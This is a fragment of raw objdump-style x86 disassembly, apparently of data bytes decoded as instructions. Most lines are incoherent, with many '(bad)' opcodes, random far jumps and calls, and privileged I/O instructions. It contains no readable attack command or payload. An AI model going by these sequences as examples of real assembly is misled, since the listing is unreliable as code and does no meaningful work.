  416e1b:	xor    ebp,DWORD PTR [eax+0x5]
  416e1e:	into   
  416e1f:	pop    eax
  416e20:	pop    esi
  416e21:	push   0xffffffec
  416e23:	mov    al,0x9d
  416e25:	std    
  416e26:	lds    eax,FWORD PTR [edi]
  416e28:	cdq    
  416e29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e2a:	jns    0x416daf
  416e2c:	rcr    DWORD PTR [eax+0x11],cl
  416e2f:	dec    edi
  416e30:	cmp    ebp,edi
  416e32:	and    al,0x85
  416e34:	jbe    0x416e5c
  416e36:	aad    0xe6
  416e38:	sbb    al,BYTE PTR [ecx-0x2828044c]
  416e3e:	push   edi
  416e3f:	mov    esi,0x939e8fc2
  416e44:	outs   dx,DWORD PTR ds:[esi]
  416e45:	cli    
  416e46:	sbb    ch,BYTE PTR [esi+edi*2+0x38]
  416e4a:	adc    ebx,DWORD PTR [ebx-0xd]
  416e4d:	loopne 0x416de8
  416e4f:	inc    ecx
  416e50:	xchg   ecx,eax
  416e51:	cwde   
  416e52:	mov    bl,0x6a
  416e54:	push   ebx
  416e55:	rol    BYTE PTR [ecx+edi*1-0x1a],0x60
  416e5a:	mov    dh,0x6
  416e5c:	inc    edx
  416e5d:	sbb    edi,DWORD PTR [edx-0x3d5b7bfb]
  416e63:	sub    BYTE PTR [ecx+0xf],ch
  416e66:	push   esi
  416e67:	jnp    0x416eab
  416e69:	mov    WORD PTR [edi+ecx*1],cs
  416e6c:	faddp  st(7),st
  416e6e:	or     ah,al
  416e70:	retf   
  416e71:	jnp    0x416ecb
  416e73:	cmp    DWORD PTR [eax-0x66d44ce7],ebp
  416e79:	xchg   edi,eax
  416e7a:	pop    ebx
  416e7b:	stc    
  416e7c:	loope  0x416eb7
  416e7e:	add    ecx,esp
  416e80:	out    0xd4,al
  416e82:	push   edi
  416e83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e84:	xchg   DWORD PTR [edx],edi
  416e86:	jg     0x416e6f
  416e88:	repnz xchg esp,eax
  416e8a:	shl    BYTE PTR [edx],0x7f
  416e8d:	fs (bad) 
  416e90:	or     eax,DWORD PTR [eax]
	...
  416ef2:	add    BYTE PTR [eax],al
  416ef4:	mov    edi,0xae6d8e19
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0xa28b8eea
  416f02:	jbe    0x416f68
  416f04:	jl     0x416ef8
  416f06:	add    BYTE PTR [eax],al
  416f08:	add    eax,0xa1000001
  416f0d:	sti    
  416f0e:	sbb    DWORD PTR [ecx+ebp*4],ecx
  416f11:	jl     0x416ee2
  416f13:	test   DWORD PTR [esi+0x244217e8],edi
  416f19:	cmp    ch,BYTE PTR [edx]
  416f1b:	imul   ecx,edi,0x6e168fab
  416f21:	sbb    BYTE PTR [ebp-0x277589ac],0x28
  416f28:	enter  0xdc4a,0xde
  416f2c:	jae    0x416f72
  416f2e:	or     eax,0x6ab131ab
  416f33:	dec    esp
  416f34:	cli    
  416f35:	dec    ebx
  416f36:	cs call 0x2a75576c
  416f3c:	cmp    ecx,DWORD PTR [edi+ebp*1-0x7]
  416f40:	push   ds
  416f41:	(bad)  
  416f42:	in     al,0x79
  416f44:	ror    DWORD PTR [ecx],0x60
  416f47:	xor    BYTE PTR [edi+0xe14e36d],0x2d
  416f4e:	pop    ds
  416f4f:	push   eax
  416f50:	dec    ecx
  416f51:	or     cl,BYTE PTR [edx]
  416f53:	cmp    cl,bh
  416f55:	in     al,dx
  416f56:	xchg   edi,eax
  416f57:	adc    ah,BYTE PTR [esi+0x54]
  416f5a:	add    WORD PTR [eax],ax
  416f5d:	mov    BYTE PTR [esi+ecx*1+0x18b058cc],ah
  416f64:	fs pushf 
  416f66:	pop    eax
  416f67:	mov    ecx,0x3b33a31d
  416f6c:	push   ebx
  416f6d:	pusha  
  416f6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f6f:	pop    ds
  416f70:	inc    ebx
  416f71:	mov    al,0x4f
  416f73:	mov    dl,0x8c
  416f75:	int3   
  416f76:	imul   eax,DWORD PTR [ebx+edi*8],0x9adf0573
  416f7d:	add    DWORD PTR [edi+ecx*4],0xf5a0c2a0
  416f84:	sub    al,0xb8
  416f87:	jo     0x416f30
  416f89:	and    eax,0x49f2f4c9
  416f8e:	push   eax
  416f8f:	(bad)  
  416f90:	mov    ds:0x7a83ad7a,eax
  416f95:	shr    DWORD PTR [eax+edi*2-0x4c],0xa0
  416f9a:	push   esi
  416f9b:	push   esi
  416f9c:	sbb    BYTE PTR [edi-0x11],cl
  416f9f:	loop   0x416f58
  416fa1:	cmp    eax,0x1c646cd7
  416fa6:	xor    eax,0x9fefce97
  416fab:	pop    ss
  416fac:	fst    QWORD PTR [edx]
  416fae:	mov    ebx,0x3c6da86
  416fb3:	daa    
  416fb4:	jp     0x416fca
  416fb6:	(bad)  [edx-0x37]
  416fb9:	push   esp
  416fba:	mov    bl,0x5d
  416fbc:	add    ebp,ebp
  416fbe:	leave  
  416fbf:	sub    DWORD PTR [esi-0x676055c0],0x9a87d417
  416fc9:	or     BYTE PTR [edi-0x1dc90f5b],0xf6
  416fd0:	enter  0x10d7,0x58
  416fd4:	mov    WORD PTR es:[eax],ss
  416fd7:	repnz pop eax
  416fd9:	jl     0x416f8f
  416fdb:	add    DWORD PTR [esi-0x692ed1e6],0x6
  416fe2:	out    0xd7,eax
  416fe4:	(bad)  
  416fe5:	out    dx,eax
  416fe6:	stos   BYTE PTR es:[edi],al
  416fe7:	dec    eax
  416fe8:	fisttp WORD PTR [esi]
  416fea:	stc    
  416feb:	mov    eax,DWORD PTR [ecx+0x70ba3585]
  416ff1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ff2:	xor    eax,0x58832493
  416ff7:	ins    DWORD PTR es:[edi],dx
  416ff8:	(bad)  
  416ff9:	dec    edi
  416ffa:	xchg   esi,eax
  416ffb:	sbb    eax,0xdd4af93b
  417000:	push   edi
  417001:	sbb    eax,0xc6d53e09
  417006:	in     eax,0x32
  417008:	inc    esp
  417009:	call   0xb98095da
  41700e:	adc    DWORD PTR [eax+0x89],edx
	...
  417074:	jbe    0x4170a3
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    esi,DWORD PTR [edi+0x5c]
  417082:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417083:	ins    BYTE PTR es:[edi],dx
  417084:	xor    ebx,0x1050000
  41708a:	add    BYTE PTR [eax],al
  41708c:	dec    edx
  41708d:	dec    ebx
  41708e:	and    BYTE PTR [edi-0x64b50787],0xd8
  417095:	jp     0x4170eb
  417097:	(bad)  
  417098:	xchg   ecx,eax
  417099:	mov    esp,edi
  41709b:	in     eax,0x29
  41709d:	push   0x97a9adf5
  4170a2:	cld    
  4170a3:	pop    ecx
  4170a4:	fsubr  DWORD PTR [edx+0x55c63e2]
  4170aa:	cli    
  4170ab:	mov    ebp,0xf3abccd2
  4170b0:	cmp    bl,dh
  4170b2:	xor    esp,ebx
  4170b4:	cmp    edx,esp
  4170b6:	cmp    eax,0xdcb21b18
  4170bb:	out    0xa7,eax
  4170bd:	je     0x41706b
  4170bf:	dec    edx
  4170c0:	lds    ebx,FWORD PTR [ebx]
  4170c2:	call   0x2c7bfa05
  4170c7:	mov    cl,0xb
  4170c9:	sbb    DWORD PTR [ebx],ebx
  4170cb:	test   BYTE PTR [ebx],dh
  4170cd:	cwde   
  4170ce:	mov    dh,0x6a
  4170d0:	sub    DWORD PTR [esi+0x6b],esp
  4170d3:	outs   dx,BYTE PTR ds:[esi]
  4170d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170d5:	xchg   edx,eax
  4170d6:	push   0x9efd497e
  4170db:	inc    edx
  4170dc:	xor    DWORD PTR [ecx-0x7c5494e4],0xffffffb6
  4170e3:	push   cs
  4170e4:	ins    BYTE PTR es:[edi],dx
  4170e5:	addr16 mov esi,0x982f906e
  4170eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170ec:	ret    0xb2d
  4170ef:	sbb    BYTE PTR [eax+0x3d],0xf0
  4170f3:	dec    edi
  4170f4:	popf   
  4170f5:	mov    cl,0x2b
  4170f7:	out    dx,al
  4170f8:	test   DWORD PTR [eax],ebp
  4170fa:	sub    ecx,DWORD PTR [esi-0x78]
  4170fd:	scas   eax,DWORD PTR es:[edi]
  4170fe:	pop    esp
  4170ff:	sub    ebx,DWORD PTR [ecx+0x2a68bd6]
  417105:	mov    eax,ds:0xd10961fe
  41710a:	and    DWORD PTR [ecx-0x4b],ebp
  41710d:	repz jmp 0xcf08ab86
  417113:	retf   0x50cd
  417116:	adc    DWORD PTR [edx-0x15b54fdf],ebx
  41711c:	enter  0xe62b,0x57
  417120:	pop    ds
  417121:	pop    esp
  417122:	adc    ecx,ebp
  417124:	fdiv   st(0),st
  417126:	cmp    eax,0xc598d54a
  41712b:	or     BYTE PTR [edx+edi*1+0x73669ca],ch
  417132:	js     0x4170c5
  417134:	push   eax
  417135:	xchg   ebp,eax
  417136:	test   eax,0x2726c8f8
  41713b:	mov    ah,0xb4
  41713d:	xchg   ebp,eax
  41713e:	(bad)  
  41713f:	mov    dh,0x9f
  417141:	popf   
  417142:	pushf  
  417143:	ins    BYTE PTR es:[edi],dx
  417144:	mov    ebx,0xe638ce8
  417149:	retf   
  41714a:	or     eax,0x8866e4c1
  41714f:	mov    al,0x83
  417151:	add    BYTE PTR [ecx+esi*8-0x29],bl
  417155:	mov    al,ds:0x708dcc73
  41715a:	lahf   
  41715b:	sti    
  41715c:	mov    ds:0x9e2b211c,al
  417161:	stos   DWORD PTR es:[edi],eax
  417162:	out    0xf6,eax
  417164:	call   0xfbf1e5e2
  417169:	sub    DWORD PTR [eax+ecx*1+0x60],esi
  41716d:	xor    dh,BYTE PTR [ecx]
  41716f:	sti    
  417170:	int3   
  417171:	stos   BYTE PTR es:[edi],al
  417172:	fst    st(3)
  417174:	inc    ecx
  417175:	xor    BYTE PTR [ebp-0x76],0xfd
  417179:	ret    0xab72
  41717c:	in     al,0x15
  41717e:	jmp    0xa2eddbed
  417183:	ds mov ebp,0xe051a8a5
  417189:	popf   
  41718a:	aad    0xea
  41718c:	retf   
  41718d:	xchg   DWORD PTR [eax],edi
  41718f:	aad    0x68
	...
  4171f1:	add    BYTE PTR [eax],al
  4171f3:	add    BYTE PTR [esi-0xe58fe7],ah
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	inc    ebp
  417202:	mov    BYTE PTR [edi],cl
  417204:	xchg   ah,dh
  417206:	add    BYTE PTR [eax],al
  417208:	add    eax,0x51000001
  41720d:	lods   eax,DWORD PTR ds:[esi]
  41720e:	ins    BYTE PTR es:[edi],dx
  41720f:	sub    BYTE PTR [eax+0x27],al
  417212:	jp     0x417288
  417214:	test   al,0x24
  417216:	xor    al,0x57
  417218:	pop    esp
  417219:	fstp   QWORD PTR [edx-0x50]
  41721c:	loope  0x41723b
  41721e:	mov    edx,DWORD PTR [ebx]
  417220:	pop    ebp
  417221:	das    
  417222:	dec    ebp
  417223:	iret   
  417224:	pop    es
  417225:	test   BYTE PTR [edx],al
  417227:	std    
  417228:	xchg   ebp,eax
  417229:	mov    ds:0x8d3085c1,al
  41722e:	jo     0x41727e
  417230:	out    dx,eax
  417231:	cmp    eax,0xff5e27f0
  417236:	pop    esi
  417237:	js     0x4172a5
  417239:	sti    
  41723a:	test   eax,0xe7e810e0
  41723f:	push   ebp
  417240:	inc    edx
  417241:	xor    BYTE PTR [esi+ebx*8+0xe908527],bl
  417248:	inc    ecx
  417249:	iret   
  41724a:	push   ecx
  41724b:	xor    DWORD PTR [ecx+0x3d],ecx
  41724e:	ds int3 
  417250:	(bad)  
  417252:	jecxz  0x41724e
  417254:	sub    BYTE PTR [esi+0x31751ca6],al
  41725a:	and    bl,0x3c
  41725d:	push   esp
  41725e:	xchg   DWORD PTR [edx-0x25269314],esi
  417264:	jg     0x4172a6
  417266:	mov    ds:0x835a943f,eax
  41726b:	clc    
  41726c:	aas    
  41726d:	inc    edx
  41726e:	jo     0x41729e
  417270:	lods   al,BYTE PTR ds:[esi]
  417271:	adc    BYTE PTR [esi+0x69],cl
  417274:	out    0x60,eax
  417276:	mov    edx,0x7f753d96
  41727b:	mov    edx,0x600bfbc4
  417280:	or     al,0xb3
  417282:	stc    
  417283:	in     eax,0x6c
  417285:	jnp    0x417252
  417287:	jae    0x417241
  417289:	sub    eax,0xf9b7ae52
  41728e:	cs push ebx
  417290:	jge    0x4172d2
  417292:	push   cs
  417293:	dec    ecx
  417294:	fs gs mov esp,0x55382917
  41729b:	jbe    0x4172c5
  41729d:	inc    DWORD PTR [ebx]
  41729f:	in     eax,0x59
  4172a1:	and    ebx,DWORD PTR [esi+edi*8-0x11]
  4172a5:	mov    ch,al
  4172a7:	ds jnp 0x41728b
  4172aa:	mov    esi,0xb13a2ccf
  4172af:	dec    esi
  4172b0:	mov    eax,0x3b1e223
  4172b5:	mov    esi,0xcbc32549
  4172ba:	cli    
  4172bb:	jns    0x4172e1
  4172bd:	jecxz  0x4172da
  4172bf:	sub    ebp,DWORD PTR [edi+0x3b]
  4172c2:	ficom  WORD PTR [ecx+0x2247beae]
  4172c8:	cli    
  4172c9:	cmp    DWORD PTR [ebx],ecx
  4172cb:	bound  esi,QWORD PTR [esi+0x12dcbe82]
  4172d1:	pusha  
  4172d2:	std    
  4172d3:	add    edi,ecx
  4172d5:	pop    ebx
  4172d6:	in     eax,0x2c
  4172d8:	call   0x58a:0x8d430ea4
  4172df:	or     eax,0xa0c44c93
  4172e4:	cld    
  4172e5:	push   ebp
  4172e6:	dec    edx
  4172e7:	xor    ah,ch
  4172e9:	inc    esp
  4172ea:	gs mov ?,edi
  4172ed:	test   al,0xcc
  4172ef:	mov    edi,0xf7a5d686
  4172f4:	fimul  WORD PTR [ebx+esi*8-0x5ba465f6]
  4172fb:	mov    ch,0xb8
  4172fd:	addr16 pop edx
  4172ff:	pushf  
  417300:	enter  0x18f0,0x99
  417304:	push   esp
  417305:	add    ebx,DWORD PTR [esi]
  417307:	pop    edx
  417308:	mov    ebp,0x58cad8a2
  41730d:	push   ebp
  41730e:	jg     0x417360
  417310:	imul   eax,DWORD PTR [eax],0x0
	...
  417373:	add    BYTE PTR [ecx-0x44],ch
  417376:	xlat   BYTE PTR ds:[ebx]
  417377:	pop    esi
  417378:	xlat   BYTE PTR ds:[ebx]
  417379:	jg     0x417364
  41737b:	mov    edi,0x6508016b
  417380:	cmp    al,0x73
  417382:	jge    0x4173fb
  417384:	mov    esi,ebp
  417386:	add    BYTE PTR [eax],al
  417388:	add    eax,0x37000001
  41738d:	dec    ebp
  41738e:	mov    esp,0x8ff1eb98
  417393:	addr16 sahf 
  417395:	mov    esp,DWORD PTR [edi]
  417397:	mov    cs,WORD PTR [esi]
  417399:	mov    edx,0xcd6bd461
  41739e:	add    al,0x34
  4173a0:	pop    es
  4173a1:	mov    eax,0xb734390
  4173a6:	scas   eax,DWORD PTR es:[edi]
  4173a7:	pop    ds
  4173a8:	xchg   ebp,eax
  4173a9:	mov    esi,0x156e84cf
  4173ae:	and    al,0x28
  4173b0:	mov    bl,0x55
  4173b2:	pop    esp
  4173b3:	dec    edx
  4173b4:	dec    ebp
  4173b5:	lods   al,BYTE PTR ds:[esi]
  4173b6:	add    ebx,edx
  4173b8:	mov    ebx,0x8b3e6158
  4173bd:	fst    DWORD PTR [edi+ecx*1-0x60]
  4173c1:	ins    DWORD PTR es:[edi],dx
  4173c2:	push   0xb55559db
  4173c7:	ins    BYTE PTR es:[edi],dx
  4173c8:	cmc    
  4173c9:	clc    
  4173ca:	inc    esp
  4173cb:	push   ebp
  4173cc:	ins    BYTE PTR es:[edi],dx
  4173cd:	sub    eax,0xb4ff42b0
  4173d2:	jp     0x41735a
  4173d4:	ins    BYTE PTR es:[edi],dx
  4173d5:	jmp    0xa0ee:0xa6235afe
  4173dc:	outs   dx,BYTE PTR ds:[esi]
  4173dd:	or     ebp,ebp
  4173df:	adc    ebp,DWORD PTR [ebx]
  4173e1:	pop    ds
  4173e2:	mov    edx,0x503b29d9
  4173e7:	or     edi,DWORD PTR ds:0x714ee6a
  4173ed:	cmp    al,0xf0
  4173ef:	and    BYTE PTR [edx],dl
  4173f1:	push   ss
  4173f2:	arpl   WORD PTR [ebx],dx
  4173f4:	aad    0xcf
  4173f6:	mov    dh,0xce
  4173f8:	(bad)  
  4173f9:	clc    
  4173fa:	js     0x41746e
  4173fc:	fstp   QWORD PTR [edi+0x222ab0c7]
  417402:	les    esi,FWORD PTR [ebx+0x50]
  417405:	aad    0x6d
  417407:	rol    BYTE PTR [esi+0x585b72e5],0x8f
  41740e:	mov    bh,BYTE PTR [ebx+0x3b]
  417411:	(bad)  
  417412:	jmp    DWORD PTR [ebp-0x1c]
  417415:	gs int3 
  417417:	jb     0x41742e
  417419:	ret    0x2973
  41741c:	jb     0x417438
  41741e:	jg     0x4173e3
  417420:	inc    DWORD PTR [edx-0x36]
  417423:	and    ecx,DWORD PTR [ebx+0x46c309fe]
  417429:	bound  ecx,QWORD PTR [esi+ebx*1+0x2b9e8fc4]
  417430:	mov    ebp,0x4a11ead4
  417435:	shr    BYTE PTR [eax],0x31
  417438:	lods   al,BYTE PTR ds:[esi]
  417439:	jmp    0x8cde:0x93471456
  417440:	add    ah,BYTE PTR [esi-0x8]
  417443:	adc    BYTE PTR ds:0xb315ec14,0x2
  41744a:	icebp  
  41744b:	int3   
  41744c:	sub    al,0x30
  41744e:	pop    ds
  41744f:	(bad)
  417453:	cmp    dh,BYTE PTR [esi+0x11]
  417456:	sahf   
  417457:	jbe    0x417444
  417459:	addr16 push eax
  41745b:	inc    ecx
  41745c:	aad    0x84
  41745e:	push   es
  41745f:	inc    edi
  417460:	mov    ds:0x9b924197,al
  417465:	pop    ss
  417466:	jmp    0x220b27a1
  41746b:	(bad)  
  41746c:	and    al,0xda
  41746e:	ins    BYTE PTR es:[edi],dx
  41746f:	jne    0x4174ce
  417471:	pop    ss
  417472:	sub    esi,DWORD PTR [esi]
  417474:	and    DWORD PTR [ecx-0xf],0x2f
  417478:	mov    ss,WORD PTR [edi]
  41747a:	jne    0x4174b4
  41747c:	retf   
  41747d:	fild   WORD PTR [esi]
  41747f:	sub    BYTE PTR [esi-0x2137cf62],bh
  417485:	push   edi
  417486:	mov    bh,ah
  417488:	outs   dx,BYTE PTR ds:[esi]
  417489:	mov    ah,dh
  41748b:	outs   dx,BYTE PTR ds:[esi]
  41748c:	imul   edi,DWORD PTR [edi+0x448a5f],0x0
	...
  4174f2:	add    BYTE PTR [eax],al
  4174f4:	xchg   ecx,eax
  4174f5:	mov    edx,0xdc6b0c6a
  4174fa:	idiv   DWORD PTR [edi+0x212a686b]
  417500:	retf   0x2f20
  417503:	mov    ch,0x90
  417505:	test   BYTE PTR [eax],0x0
  417508:	add    eax,0xe3000001
  41750d:	lods   al,BYTE PTR ds:[esi]
  41750e:	jae    0x417543
  417510:	and    ebx,esp
  417512:	adc    esp,DWORD PTR cs:[edi+0x7]
  417516:	shl    DWORD PTR [esi],0x0
  417519:	push   ecx
  41751a:	ds scas eax,DWORD PTR es:[edi]
  41751c:	int    0x47
  41751e:	test   esi,ebx
  417520:	stc    
  417521:	push   ebx
  417522:	stos   BYTE PTR es:[edi],al
  417523:	pop    eax
  417524:	xchg   edi,eax
  417525:	cmp    bh,dl
  417527:	cmp    ah,0xed
  41752a:	adc    dh,BYTE PTR [ebx-0x42]
  41752d:	inc    ecx
  41752e:	hlt    
  41752f:	lods   al,BYTE PTR ds:[esi]
  417530:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417531:	sbb    dl,BYTE PTR [edx+edi*4]
  417534:	(bad)  
  417535:	xor    al,0x25
  417537:	aad    0xff
  417539:	cmp    BYTE PTR [ebx-0x21],al
  41753c:	adc    al,BYTE PTR [edx]
  41753e:	mov    BYTE PTR [edi],ah
  417540:	fistp  QWORD PTR [edi+0x30]
  417543:	pushf  
  417544:	jmp    0x13a520d2
  417549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41754a:	inc    edx
  41754b:	adc    ah,ah
  41754d:	pop    eax
  41754e:	adc    BYTE PTR [ecx+0x22],cl
  417551:	xlat   BYTE PTR ds:[ebx]
  417552:	cwde   
  417553:	into   
  417554:	rol    BYTE PTR [esi-0x22],1
  417557:	push   esi
  417558:	lods   eax,DWORD PTR ds:[esi]
  417559:	loop   0x41756b
  41755b:	stos   DWORD PTR es:[edi],eax
  41755c:	xchg   edi,eax
  41755d:	lds    esp,FWORD PTR [ebp-0x59]
  417560:	pop    ebp
  417561:	call   0x148a:0x61e1a23b
  417568:	inc    ecx
  417569:	fsubr  st,st(6)
  41756b:	mov    edx,0xccbb82e3
  417570:	mov    ah,0xe3
  417572:	jmp    0x7d23766
  417577:	enter  0xba34,0x47
  41757b:	test   DWORD PTR [ebx],eax
  41757d:	dec    esp
  41757e:	arpl   WORD PTR [esi+0x20741164],sp
  417584:	mov    ds:0x9b7747c2,al
  417589:	and    ecx,0x69
  41758c:	fwait
  41758d:	(bad)  
  41758e:	out    dx,eax
  41758f:	and    DWORD PTR [ebx-0x2b5892ec],ebp
  417595:	mov    ds:0x3f5e2a0e,eax
  41759a:	sbb    eax,0x68b4cb2c
  41759f:	cmc    
  4175a0:	push   esp
  4175a1:	and    DWORD PTR [esi+0x5a7075b5],ebx
  4175a7:	cmp    ebx,DWORD PTR [edx+0x11]
  4175aa:	clc    
  4175ab:	adc    BYTE PTR [edx+0x2ccd6e6c],0xd6
  4175b2:	xchg   BYTE PTR [ecx-0x723b7017],al
  4175b8:	inc    ebp
  4175b9:	clc    
  4175ba:	or     eax,0xb6d1999b
  4175bf:	xlat   BYTE PTR ds:[ebx]
  4175c0:	push   ebp
  4175c1:	fbstp  TBYTE PTR ds:0xa7e4947b
  4175c7:	cdq    
  4175c8:	mov    ebx,0x31c083d7
  4175cd:	cmp    ch,ch
  4175cf:	lods   eax,DWORD PTR ds:[esi]
  4175d0:	mov    cs,ebx
  4175d2:	cmp    bh,BYTE PTR [ecx]
  4175d4:	fwait
  4175d5:	push   edi
  4175d6:	fiadd  DWORD PTR ds:0x4bc2ff61
  4175dc:	retf   0xe6c5
  4175df:	cs sbb al,0x73
  4175e2:	icebp  
  4175e3:	sub    al,0x1b
  4175e5:	dec    edx
  4175e6:	and    edi,DWORD PTR [ecx]
  4175e8:	aam    0xcb
  4175ea:	ffreep st(7)
  4175ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175ed:	adc    BYTE PTR [ebp+0x6be7b061],ch
  4175f3:	rol    DWORD PTR [ebx+0x42895e30],cl
  4175f9:	dec    ebx
  4175fa:	(bad)  
  4175fb:	sub    al,cl
  4175fd:	sub    eax,0x8fb652ca
  417602:	or     edi,ebx
  417604:	cmp    DWORD PTR [esi-0x63],esp
  417607:	ficomp DWORD PTR [ecx+edi*2]
  41760a:	xor    dh,BYTE PTR [edi+0x4cdd8768]
  417610:	hlt    
	...
  417671:	add    BYTE PTR [eax],al
  417673:	add    BYTE PTR [ecx-0x20b02c99],ch
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	fcmovb st,st(7)
  417681:	dec    eax
  417682:	ficom  DWORD PTR [edx-0x6b]
  417685:	test   DWORD PTR [eax],0x10500
  41768b:	add    BYTE PTR [esi],bl
  41768d:	aas    
  41768e:	or     esp,DWORD PTR [edi]
  417690:	xor    esp,0xffb97979
  417696:	and    eax,edx
  417698:	adc    al,0x19
  41769a:	push   esp
  41769b:	cmc    
  41769c:	daa    
  41769d:	test   ah,bl
  41769f:	sbb    ebx,DWORD PTR [ebx+0x43]
  4176a2:	adc    dl,BYTE PTR [esi]
  4176a4:	jle    0x4176a2
  4176a6:	sbb    esp,DWORD PTR [edx]
  4176a8:	cmp    bh,0x86
  4176ab:	push   ss
  4176ac:	cld    
  4176ad:	push   ss
  4176ae:	sar    DWORD PTR [esi-0x4d07ea39],cl
  4176b4:	test   eax,0x691e5166
  4176b9:	cmp    edi,esp
  4176bb:	jb     0x417643
  4176bd:	sbb    eax,0x4fc3d985
  4176c2:	shl    BYTE PTR [edx],1
  4176c4:	or     BYTE PTR [ebx-0x16948403],dh
  4176ca:	xor    edx,edx
  4176cc:	mov    cs,WORD PTR ds:0x76af968a
  4176d2:	dec    edx
  4176d3:	sub    eax,0x507a3abb
  4176d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176d9:	int    0x3c
  4176db:	js     0x417702
  4176dd:	dec    esp
  4176de:	outs   dx,DWORD PTR ds:[esi]
  4176df:	lods   al,BYTE PTR ds:[esi]
  4176e0:	mov    ch,0x30
  4176e2:	adc    BYTE PTR [ecx],bh
  4176e4:	pop    ebx
  4176e5:	cmc    
  4176e6:	arpl   WORD PTR [ebp-0x514337eb],bp
  4176ec:	es xchg ecx,eax
  4176ee:	stc    
  4176ef:	rep outs dx,BYTE PTR ds:[esi]
  4176f1:	sbb    cl,BYTE PTR [ebx-0x4627c959]
  4176f7:	push   esi
  4176f8:	mov    dl,dl
  4176fa:	jl     0x4176dc
  4176fc:	dec    ebx
  4176fd:	ror    dl,cl
  4176ff:	ret    0xf4eb
  417702:	sbb    ebp,DWORD PTR [ebx-0x4b]
  417705:	mov    dh,0x48
  417707:	repz fisub DWORD PTR [edx+0xc7f9ef2]
  41770e:	mov    ds:0xeb055f2c,al
  417713:	lock loop 0x417706
  417716:	or     eax,0x1eccf951
  41771b:	std    
  41771c:	cs add al,0xe5
  41771f:	pop    edx
  417720:	inc    esp
  417721:	out    0x9a,al
  417723:	mov    bl,0xb
  417725:	xor    DWORD PTR [ebx+0x25],0xf17ea81b
  41772c:	jmp    0x417723
  41772e:	ret    0x6bc9
  417731:	cmp    al,0x11
  417733:	(bad)  
  417734:	rcl    BYTE PTR [esi],cl
  417736:	mov    DWORD PTR [eax-0x51],edx
  417739:	xchg   ebp,eax
  41773a:	pop    es
  41773b:	mov    edx,0x560bcd45
  417740:	out    0x41,eax
  417742:	loopne 0x417779
  417744:	stos   BYTE PTR es:[edi],al
  417745:	popf   
  417746:	push   ebx
  417747:	ins    BYTE PTR es:[edi],dx
  417748:	xchg   esp,eax
  417749:	inc    eax
  41774a:	jl     0x4176fd
  41774c:	pop    ecx
  41774d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41774e:	das    
  41774f:	in     eax,0xfd
  417751:	repnz adc esp,DWORD PTR [ecx]
  417754:	sbb    edx,ebx
  417756:	cmc    
  417757:	push   ecx
  417758:	outs   dx,DWORD PTR ds:[esi]
  417759:	cmp    al,0xa7
  41775b:	and    BYTE PTR [ecx+0x5ddcb1c9],0x97
  417762:	add    DWORD PTR [ebp-0x58e6ae03],ebx
  417768:	mov    dh,0x90
  41776a:	jns    0x417740
  41776c:	imul   esi,DWORD PTR [esi+0x16687a26],0xd
  417773:	addr16 stc 
  417775:	xor    al,0x2b
  417777:	jo     0x417730
  417779:	xor    eax,0x376f3782
  41777e:	mov    edx,0x6b16231f
  417783:	dec    esp
  417784:	int3   
  417785:	jb     0x417786
  417787:	ret    
  417788:	push   0xa8c62f7d
  41778d:	stos   DWORD PTR es:[edi],eax
  41778e:	mov    fs,WORD PTR [ecx]
  417790:	dec    edx
	...
  4177f1:	add    BYTE PTR [eax],al
  4177f3:	add    cl,ch
  4177f5:	push   cs
  4177f6:	(bad)  
  4177f7:	pop    ss
  4177f8:	push   edi
  4177fa:	jmp    0x233417fd
  4177ff:	shl    BYTE PTR [eax+0x5e],cl
  417802:	cmc    
  417803:	mov    eax,0xf89a
  417808:	add    eax,0xde000001
  41780d:	jp     0x417873
  41780f:	test   DWORD PTR [ebx+0xc],esi
  417812:	stos   DWORD PTR es:[edi],eax
  417813:	jmp    0x1b3e53a3
  417818:	mov    WORD PTR [ebp+0x5273b497],gs
  41781e:	jnp    0x41783d
  417820:	imul   eax,edx,0xf108d738
  417826:	or     eax,DWORD PTR [ebx]
  417828:	push   cs
  417829:	xchg   esp,eax
  41782a:	mov    ebp,0x1e9174e0
  41782f:	xchg   ebp,eax
  417830:	sub    ch,BYTE PTR [edi-0x4b]
  417833:	aaa    
  417834:	aaa    
  417835:	jg     0x41788b
  417837:	ds pop edi
  417839:	lahf   
  41783a:	xlat   BYTE PTR ds:[ebx]
  41783b:	shl    ah,cl
  41783d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41783e:	jno    0x41784f
  417840:	hlt    
  417841:	rcl    DWORD PTR [ecx],cl
  417843:	dec    ecx
  417844:	fidiv  WORD PTR [ebx]
  417846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417847:	dec    esp
  417848:	jmp    0x41781d
  41784a:	jle    0x417872
  41784c:	xchg   edi,eax
  41784d:	ins    DWORD PTR es:[edi],dx
  41784e:	push   0xffffff84
  417850:	mov    dl,0xb1
  417852:	retf   0x8875
  417855:	pop    ebp
  417856:	jle    0x417860
  417858:	adc    al,0xef
  41785a:	jl     0x41786e
  41785c:	inc    eax
  41785d:	addr16 sub eax,0x15303818
  417863:	bound  edi,QWORD PTR [ebx-0x5911eff0]
  417869:	rcr    BYTE PTR [edi-0x43d64aa5],cl
  41786f:	js     0x4178b1
  417871:	push   0x7f
  417873:	sub    al,0x2
  417875:	mov    dh,0xfa
  417877:	test   al,0x65
  417879:	mov    ecx,edx
  41787b:	pop    ebx
  41787c:	xor    eax,0x7930f4bb
  417881:	jno    0x417807
